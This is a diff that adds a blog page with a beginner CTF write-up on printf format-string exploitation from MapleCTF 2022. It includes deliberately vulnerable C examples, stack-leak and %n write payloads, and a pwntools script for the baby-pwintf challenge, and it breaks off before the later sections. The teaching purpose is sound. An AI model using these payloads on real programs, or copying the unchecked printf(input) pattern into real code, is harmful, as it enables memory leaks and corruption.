@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/static/favicon/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/static/favicon/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/static/favicon/favicon-16x16.png">
+  <link rel="mask-icon" href="/static/favicon/safari_pinned_tab.svg" color="#222">
+  <link rel="manifest" href="/static/favicon/site.webmanifest">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="0x0 Introductionprintf is a common vulnerable in the pwn questions. Recently, I got an opportunity to try two very interesting question related to printf in MapleCTF 2022, I think it would be good if">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[pwn] Printf stuff in pwn (e.g. pwintf) [MapleCTF2022]">
+<meta property="og:url" content="http://www.aynakeya.com/2022/02/03/ctf/how-to-utilize-printf-in-pwn/index.html">
+<meta property="og:site_name" content="Aynakeya&#39;s Blog">
+<meta property="og:description" content="0x0 Introductionprintf is a common vulnerable in the pwn questions. Recently, I got an opportunity to try two very interesting question related to printf in MapleCTF 2022, I think it would be good if">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://www.aynakeya.com/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_192750.jpg">
+<meta property="og:image" content="http://www.aynakeya.com/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_205224.jpg">
+<meta property="og:image" content="http://www.aynakeya.com/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_205732.jpg">
+<meta property="og:image" content="http://www.aynakeya.com/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_225614.jpg">
+<meta property="og:image" content="http://www.aynakeya.com/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_230122.jpg">
+<meta property="og:image" content="http://www.aynakeya.com/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_230645.jpg">
+<meta property="og:image" content="http://www.aynakeya.com/images/ctf/how-to-utilize-printf-in-pwn/2022-02-03_170338.jpg">
+<meta property="article:published_time" content="2022-02-02T21:14:47.000Z">
+<meta property="article:modified_time" content="2022-09-07T04:28:54.000Z">
+<meta property="article:author" content="Aynakeya">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.aynakeya.com/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_192750.jpg">
+
+
+<link rel="canonical" href="http://www.aynakeya.com/2022/02/03/ctf/how-to-utilize-printf-in-pwn/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://www.aynakeya.com/2022/02/03/ctf/how-to-utilize-printf-in-pwn/","path":"2022/02/03/ctf/how-to-utilize-printf-in-pwn/","title":"[pwn] Printf stuff in pwn (e.g. pwintf) [MapleCTF2022]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[pwn] Printf stuff in pwn (e.g. pwintf) [MapleCTF2022] | Aynakeya's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Aynakeya's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Kill My Emotion</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/blog/" rel="section"><i class="fa fa-house fa-fw"></i>Home</a></li><li class="menu-item menu-item-infosec"><a href="/categories/ctf" rel="section"><i class="fa fa-solid fa-code fa-fw"></i>InfoSec</a></li><li class="menu-item menu-item-coding"><a href="/categories/coding" rel="section"><i class="fa fa-solid fa-code fa-fw"></i>Coding</a></li><li class="menu-item menu-item-anime"><a href="/categories/anime" rel="section"><i class="fa fa-solid fa-film fa-fw"></i>Anime</a></li><li class="menu-item menu-item-novel"><a href="/categories/novel" rel="section"><i class="fa fa-solid fa-book-open fa-fw"></i>Novel</a></li><li class="menu-item menu-item-life"><a href="/categories/life" rel="section"><i class="fa fa-solid fa-book fa-fw"></i>Life</a></li><li class="menu-item menu-item-devops"><a href="/categories/devops" rel="section"><i class="fa fa-solid fa-terminal fa-fw"></i>DevOps</a></li><li class="menu-item menu-item-archives"><a href="/archives" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-ctf-writeup"><a href="/ctf-writeup" rel="section"><i class="fa fa-book fa-fw"></i>CTF-writeup</a></li><li class="menu-item menu-item-bookmarks"><a href="/bookmarks" rel="section"><i class="fa fa-bookmark fa-fw"></i>Bookmarks</a></li><li class="menu-item menu-item-tags"><a href="/tags" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-js-projects"><a href="/my-js-project" rel="section"><i class="fas fa-folder fa-fw"></i>Js-projects</a></li><li class="menu-item menu-item-frontpage"><a href="/" rel="section"><i class="fa fa-leaf fa-fw"></i>Frontpage</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0-Introduction"><span class="nav-number">1.</span> <span class="nav-text">0x0 Introduction</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x1-What-is-printf-string-formating"><span class="nav-number">2.</span> <span class="nav-text">0x1 What is printf (string formating)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x2-How-function-are-called"><span class="nav-number">3.</span> <span class="nav-text">0x2 How function are called</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x2-Read-the-stack"><span class="nav-number">4.</span> <span class="nav-text">0x2 Read the stack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#basic-idea"><span class="nav-number">4.1.</span> <span class="nav-text">basic idea</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#verification"><span class="nav-number">4.2.</span> <span class="nav-text">verification</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#simpler-method"><span class="nav-number">4.3.</span> <span class="nav-text">simpler method</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x3-Write-on-the-stack"><span class="nav-number">5.</span> <span class="nav-text">0x3 Write on the stack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#basic-idea-1"><span class="nav-number">5.1.</span> <span class="nav-text">basic idea</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#example"><span class="nav-number">5.2.</span> <span class="nav-text">example</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#n-hn-hhn"><span class="nav-number">5.3.</span> <span class="nav-text">%n? %hn? %hhn</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x4-Example-baby-pwintf"><span class="nav-number">6.</span> <span class="nav-text">0x4 Example baby-pwintf</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x4-Example-pwintf"><span class="nav-number">7.</span> <span class="nav-text">0x4 Example pwintf</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Mitigation"><span class="nav-number">7.1.</span> <span class="nav-text">Mitigation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Quick-look"><span class="nav-number">7.2.</span> <span class="nav-text">Quick look</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#change-rip-of-printf-unintended"><span class="nav-number">7.3.</span> <span class="nav-text">change rip of printf (unintended)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exploit-py"><span class="nav-number">7.3.1.</span> <span class="nav-text">exploit.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#write-rop-to-chain-to-free-hook-intended-solution"><span class="nav-number">7.4.</span> <span class="nav-text">write rop to chain to free_hook (intended solution)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exploit-py-1"><span class="nav-number">7.4.1.</span> <span class="nav-text">exploit.py</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flag"><span class="nav-number">7.5.</span> <span class="nav-text">flag</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Aynakeya"
+      src="/static/intro/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Aynakeya</p>
+  <div class="site-description" itemprop="description">my blog~</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives">
+          <span class="site-state-item-count">91</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags">
+        <span class="site-state-item-count">73</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/aynakeya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;aynakeya" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:aynakeya@aynakeya.com" title="E-Mail → mailto:aynakeya@aynakeya.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://space.bilibili.com/10003632" title="Bilibili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;10003632" rel="noopener me" target="_blank"><i class="fas fa-video fa-fw"></i>Bilibili</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://www.aynakeya.com/2022/02/03/ctf/how-to-utilize-printf-in-pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/static/intro/images/avatar.jpg">
+      <meta itemprop="name" content="Aynakeya">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aynakeya's Blog">
+      <meta itemprop="description" content="my blog~">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[pwn] Printf stuff in pwn (e.g. pwintf) [MapleCTF2022] | Aynakeya's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [pwn] Printf stuff in pwn (e.g. pwintf) [MapleCTF2022]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-02-03 05:14:47" itemprop="dateCreated datePublished" datetime="2022-02-03T05:14:47+08:00">2022-02-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-09-07 12:28:54" itemprop="dateModified" datetime="2022-09-07T12:28:54+08:00">2022-09-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p><strong>printf</strong> is a common vulnerable in the pwn questions. Recently, I got an opportunity to try two very interesting question related to printf in MapleCTF 2022, I think it would be good if I wrote my experience about printf so that I could reinforce my understanding about printf stuff.</p>
+<p>Anyway, I would try to explain as much as detail in the article in order to make it beginner friendly.</p>
+<p>Hope this article can help you in printf</p>
+<h1 id="0x1-What-is-printf-string-formating"><a href="#0x1-What-is-printf-string-formating" class="headerlink" title="0x1 What is printf (string formating)"></a>0x1 What is printf (string formating)</h1><p>so, string format is a way to print out data by stating its format in a string.</p>
+<span id="more"></span>
+
+<p>for example, the code below will print out <strong>&quot;Hello, printf , I&#39;m 16 year old&quot;</strong>. We can see that string &quot;%s&quot; is replace by &quot;printf&quot; and &quot;%d&quot; is replaced by 0x10 (which is 16 in decimal)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;Hello, %s , I&#x27;m %d year old&quot;,&quot;printf&quot;,0x10)</span><br></pre></td></tr></table></figure>
+
+<p>all the character start with <strong>%</strong> is called <strong>format string</strong>, there are serveral different format string you can use in C.</p>
+<p>Here is some commonly used format string, ignore <code>%n</code> for now. We will come to it later</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%d      integer</span><br><span class="line">%s      char</span><br><span class="line">%l      long int</span><br><span class="line">%ll     long long int</span><br><span class="line">%p      pointer </span><br><span class="line">%x      unsigned hexadecimal</span><br><span class="line">%n      write number of printed character in 4 byte</span><br><span class="line">%hn     write number of printed character in 2 byte</span><br><span class="line">%hhn    write number of printed character in 1 byte</span><br><span class="line"></span><br><span class="line">%10$?   use 10th parameter and print in format of ?</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x2-How-function-are-called"><a href="#0x2-How-function-are-called" class="headerlink" title="0x2 How function are called"></a>0x2 How function are called</h1><p>Before talking about the printf, first thing we need to know is how a function are called and how parameter are passed.</p>
+<p>In one words, x86 push all parameter into the stack. x64 move first 6 parameter into register and push rest parameters in to the stack.</p>
+<p>for example</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bar(100,200)</span><br></pre></td></tr></table></figure>
+
+<p>In <strong>x86</strong>, the stack would look like this</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Bar Stack (current)</span><br><span class="line">EBP</span><br><span class="line">EIP</span><br><span class="line">200 - para2</span><br><span class="line">100 - para1</span><br><span class="line">Pararent Stack</span><br></pre></td></tr></table></figure>
+
+<p>While in <strong>x64</strong>, the stack would look like this and two paramter, 100 is saved in the <code>rdi</code> and 200 is saved in the <code>rsi</code>. Since there there are only two argument, there is no extra value pushed into the stack.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Bar Stack (current)</span><br><span class="line">RBP</span><br><span class="line">RIP</span><br><span class="line">Pararent Stack</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_192750.jpg" alt="2022-02-02_192750.jpg"></p>
+<h1 id="0x2-Read-the-stack"><a href="#0x2-Read-the-stack" class="headerlink" title="0x2 Read the stack"></a>0x2 Read the stack</h1><h2 id="basic-idea"><a href="#basic-idea" class="headerlink" title="basic idea"></a>basic idea</h2><p>Here is a simple vulnerable code, can you figure out a way to let program print out <code>*buf</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">  int x = 0x1337;</span><br><span class="line">  char *buf = &quot;my super secret&quot;;</span><br><span class="line">  char s[0x20];</span><br><span class="line">  printf(&quot;hello here is my number %d\n&quot;, x);</span><br><span class="line">  while (1)</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;please enter: &quot;);</span><br><span class="line">    fgets(s, 0x20, stdin);</span><br><span class="line">    puts(&quot;You Enter: &quot;);</span><br><span class="line">    printf(s); //!! here</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>printf(s)</code> give us the opportunity. As I mentioned in the Part1, the computer didn&#39;t care about what parameter you actually pass in. It read whatever is in the register and on the stack.</p>
+<p>Assume you put <code>%p-%p-%p-%p</code> in the string <code>s</code>. The computer don&#39;t know you didn&#39;t pass other 4 parameter. It will just read whatever is store in the register and stack. </p>
+<p>For example ,in x64, it will print out address in <code>&quot;rsi-rdx-rcx-r8&quot;</code>.</p>
+<p>So, if we continue to print out, and used out all the 6 register. printf will assume there is some data in the stack, so printf will then get data from stack and print it out.</p>
+<p>This give us a way off leaking data on the stack.</p>
+<h2 id="verification"><a href="#verification" class="headerlink" title="verification"></a>verification</h2><p>Lets check with a debugger. </p>
+<p>First before call <code>printf</code>, the stack looks like this, we can see our <code>x</code> is at rsp, and <code>buf</code> is locate right under rsp.<br><img data-src="/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_205224.jpg" alt="2022-02-02_205224.jpg"></p>
+<p>Lets enter <code>%p%p%p%p%p %p-%s</code>.</p>
+<ul>
+<li>The first 5 <code>%p</code> is used for the rest of 5 registers</li>
+<li>than <code>x</code> and <code>buf</code> is printed by by format <code>%p</code> and <code>%s</code></li>
+</ul>
+<p>We got exactly what we want<br><img data-src="/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_205732.jpg" alt="2022-02-02_205732.jpg"></p>
+<p>we can also use <code>%p%p%p%p%p %p-%p</code> to print out the address of <code>buf</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">You Enter:</span><br><span class="line">0x56206ad2e2a0(nil)0x7fdee909b1e70xc(nil) 0x1337-0x562069b06004</span><br></pre></td></tr></table></figure>
+
+<h2 id="simpler-method"><a href="#simpler-method" class="headerlink" title="simpler method"></a>simpler method</h2><p>using <code>%p%p%p%p%p %p-%p</code> is ok when we have large input size. But what happen if we don&#39;t have enough input size.</p>
+<p>We can use <code>%num$format</code> to get the same result.</p>
+<p>for example, we want to get the <code>x</code> and <code>buf</code>. We know from previous, we can get x from 6th parameter and buf from 7th parameter.</p>
+<p>so, we can use <code>%6$p-%7$s</code> as a substitution. And we got the same result as <code>%p%p%p%p%p %p-%s</code></p>
+<p><img data-src="/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_225614.jpg" alt="2022-02-02_225614.jpg"></p>
+<h1 id="0x3-Write-on-the-stack"><a href="#0x3-Write-on-the-stack" class="headerlink" title="0x3 Write on the stack"></a>0x3 Write on the stack</h1><h2 id="basic-idea-1"><a href="#basic-idea-1" class="headerlink" title="basic idea"></a>basic idea</h2><p>in order to write data by printf, We need use the <strong>debug features</strong> of printf - <code>%n</code>, <code>%hn</code>, and <code>%hhn</code>.</p>
+<p>basicly, <code>%n</code> allow you write <strong>total number of character printed</strong> into a int pointer.</p>
+<p>For example, following code will change x to 5 after printf.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">  int x = 0;</span><br><span class="line">  printf(&quot;before, x = %d\n&quot;,x); // here x = 0</span><br><span class="line">  printf(&quot;12345%n\n&quot;,&amp;x);</span><br><span class="line">  printf(&quot;after, x = %d\n&quot;,x); // this will print x = 5</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>lets modify the example in the read. In this example, we need to find a way changing x to 0x1337.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">char *buf = &quot;my super secret&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">  int *x = malloc(sizeof(int));</span><br><span class="line">  *x = 0x1336;</span><br><span class="line">  char s[0x20];</span><br><span class="line">  while (1)</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;hello here is my number 0x%x\n&quot;, *x);</span><br><span class="line">    puts(&quot;please enter: &quot;);</span><br><span class="line">    fgets(s, 0x20, stdin);</span><br><span class="line">    puts(&quot;You Enter: &quot;);</span><br><span class="line">    printf(s);</span><br><span class="line">    if (*x == 0x1337)&#123;</span><br><span class="line">      puts(buf);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Looking at this code, we can use again <code>printf(s)</code> to change value store in the *x.</p>
+<p>Since x is locate under the rsp if we check the debugger, we can use <code>%7$n</code> format string to point to the x.</p>
+<p><img data-src="/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_230122.jpg" alt="2022-02-02_230122.jpg"></p>
+<p>then we use <code>%4919x%7$n</code> to write 0x1337 (4919) into x. (<code>%4919x</code> means pad 4919 byte, which has 4919 length)</p>
+<p>we can see the value of x has been successfully changed.</p>
+<p><img data-src="/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_230645.jpg" alt="2022-02-02_230645.jpg"></p>
+<h2 id="n-hn-hhn"><a href="#n-hn-hhn" class="headerlink" title="%n? %hn? %hhn"></a>%n? %hn? %hhn</h2><p>we know that the different between them is how many bytes it write. </p>
+<p>Normally, we only use <code>%hn</code> and <code>%hhn</code>. </p>
+<p>Because four bytes like 0x11ffff &#x3D; 1179647 is too <strong>large</strong> for stdout to write.</p>
+<p>if we take the example above and change some value</p>
+<ul>
+<li>if x &#x3D; 0xffffffff, use <code>%1x%7$hn</code>, x will become 0xffff0001 (two bytes have been overwrited)</li>
+<li>if x &#x3D; 0xffffffff, use <code>%1x%7$hhn</code>, x will become 0xffffff01 (one bytes have been overwrited)</li>
+</ul>
+<p><strong>What if I wants to write more than 2 bytes</strong></p>
+<p>For example, if we want to write 4 bytes (0x1011) at address 0x1002</p>
+<ul>
+<li>first write lower two bytes 0x11 at 0x1002</li>
+<li>second write higher two bytes 0x10 at 0x1004</li>
+<li>depending on the endianness, if computer use big endianness, this should be write at 0x1000</li>
+</ul>
+<h1 id="0x4-Example-baby-pwintf"><a href="#0x4-Example-baby-pwintf" class="headerlink" title="0x4 Example baby-pwintf"></a>0x4 Example baby-pwintf</h1><p>Lets take look at source code <a href="/images/ctf/how-to-utilize-printf-in-pwn/baby-pwintf.c">baby-pwintf.c</a></p>
+<p>the vulnerability is quite obvious if you read through the whole article.</p>
+<p>We just need change rating to 0x1337.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">void vuln() &#123;</span><br><span class="line">    char* input = malloc(16);</span><br><span class="line">    int* rating = malloc(4);</span><br><span class="line"></span><br><span class="line">    fgets(input, 16, stdin);</span><br><span class="line">    *rating = input[0] % 11;</span><br><span class="line"></span><br><span class="line">    puts(&quot;Your name is:&quot;);</span><br><span class="line">    printf(input);</span><br><span class="line"></span><br><span class="line">    printf(&quot;I rate your name %d / 10\n&quot;, *rating);</span><br><span class="line"></span><br><span class="line">    if (*rating == 0x1337) &#123;</span><br><span class="line">        puts(&quot;Nice name! here&#x27;s a flag:&quot;);</span><br><span class="line">        win();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>part of exp.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line"># 0x1337 = 4919</span><br><span class="line">io.sendlineafter(b&quot;Tell me your name and I&#x27;ll rate it!&quot;, b&quot;%4919x%7$n&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
